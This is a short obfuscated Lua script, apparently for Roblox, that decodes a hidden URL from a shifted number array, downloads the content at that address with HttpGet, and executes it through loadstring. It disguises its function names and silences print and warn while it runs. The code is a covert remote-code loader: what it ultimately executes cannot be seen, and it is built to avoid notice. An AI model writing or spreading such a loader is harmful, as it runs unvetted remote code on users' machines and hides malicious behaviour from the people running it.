local _v1 = string; local _v2 = table; local _v3 = game;
local _v4 = {114,127,128,125,129,73,63,64,114,117,128,130,61,114,117,129,118,132,114,134,133,120,134,120,133,133,140,126,136,143,74,128,141,140,79,88,117,132,154,142,154,136,154,88,93,96,141,99,147,147,145,150,152,107,154,103,156,159,163,162,158,165,154,167,156,158,164,165,163,164,164,166,120,119,121,173,120,188,172,195,124,176,128,201,178,178,180,183,185,132,133,183,205,200,198,201,203,205,214,208,205,212,212,213,205,217,219,218,218,211,211,211,225,219,226,226,227,229,221,230,227,222,232,232,229,235,190,230,223,239,203,242,225,247,235,247,224,242,203,231,245,227,203,228,232,248,235}

local _v5 = {
    ["\103\101\116"] = function(o, u) return o:HttpGet(u, true) end,
    ["\108\100\115"] = loadstring,
    ["\100\101\102"] = function(d)
        local r = ""
        for i = 1, #d do
 
            local k = (i % 8) + (math.floor(i/10) % 5) + 8
            r = r .. _v1.char(d[i] - k)
        end
        return r
    end
}

local function _v6()
    local _s = 1
    local _f = nil
    
    while _s ~= 0 do
        if _s == 1 then
            local _g = #_v3.Name + _v3.PlaceId
            _s = (_g > 0) and 2 or 0
        elseif _s == 2 then
            local _h = tostring(_v3.HttpGet)
            if not _h:find("HttpGet") then _s = 0 break end
            
            local _u = _v5["\100\101\102"](_v4)
            local _ok, _res = pcall(_v5["\103\101\116"], _v3, _u .. "?v=" .. math.random(1, 999))
            
            if _ok and _res and #_res > 0 then
                _f = _v5["\108\100\115"](_res)
                _s = 3
            else
                _s = 0
            end
        elseif _s == 3 then
            if _f then task.spawn(_f) end
            _s = 0
        end
    end
end

local _p, _w = print, warn
print, warn = function() end, function() end
_v6()
print, warn = _p, _w
